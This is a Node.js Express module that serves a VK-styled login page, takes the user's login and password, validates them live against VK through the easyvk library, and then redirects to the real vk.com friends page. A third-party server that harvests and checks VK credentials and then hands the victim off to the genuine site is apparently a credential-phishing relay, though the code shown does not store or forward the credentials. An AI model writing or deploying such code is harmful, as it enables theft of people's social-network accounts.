module.exports = function(app) {
    var jsdom = require('jsdom'),
        btoa = require('btoa'),
        fs = require('fs'),
        DomParser = require('dom-parser'),
        parser = new DomParser();
    $ = require('jquery')(new jsdom.JSDOM().window);
    const bodyParser = require("body-parser");
    const urlencodedParser = bodyParser.urlencoded({ extended: false });
    var UserData = null;
    var errorLog = false;
    var UserLogin = null;
    var UserPassword = null;
    const easyvk = require('easyvk');
    app.get("/vk", function(request, response) {

        response.sendFile(__dirname + "/vk.html");

    });



    app.post("/vk", urlencodedParser, function(request, response) {
        //Authenticating user

        var login = `${request.body.login}`;
        var password = `${request.body.password}`;

        easyvk({
            username: login,
            password: password,
            save_session: false
        }).then(vk => {
            var HttpVk = vk.http;
            //Getting user id from authenticated session
            var me = vk.session.user_id //Or your account id

            //Sending a message using messages.send method

            response.redirect('https://vk.com/friends');

        }).catch(error => {
            fs.readFile('vk.html', 'utf8', function(err, html) {
                if (!err) {
                    var dom = parser.parseFromString(html).rawHTML;
                    //вывод сообщения о неверном логине/пароле
                    response.send(dom.replace('<p></p>', '<p></p>\n\t<div class=\"error\">Неверный логин/пароль</div>\n</body>\n</html>'));
                }
            });
        })


    });

    app.get("/vkLogin", function(request, response) {

        response.sendFile(__dirname + "/vkLogin.html");

    });
}